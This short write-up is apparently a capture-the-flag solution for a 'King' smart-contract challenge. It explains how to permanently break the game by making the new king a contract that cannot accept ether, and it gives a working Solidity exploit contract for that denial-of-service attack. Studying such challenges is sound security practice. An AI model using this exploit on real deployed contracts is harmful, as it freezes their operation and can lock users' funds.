# Answer

Goal: Break the contract functionality.

## 1. Breaking

The contract can be broken if the next winner is unable to accept eth. So we make the new king a contract without payable receive or fallback function.

```solidity
contract KingExploit {
    address k;

    // Don't forget to fund the contract during deployment
    constructor (address targetAddr) payable {
        k = targetAddr;
    }

    function exploit() public {
        // The amount doesn't matter as long as it is equal or bigger than the current "prize" of King
        (bool success,) = k.call{value: 0.11 ether}("");
        require(success, "Failed to send Ether");
    }
}
```

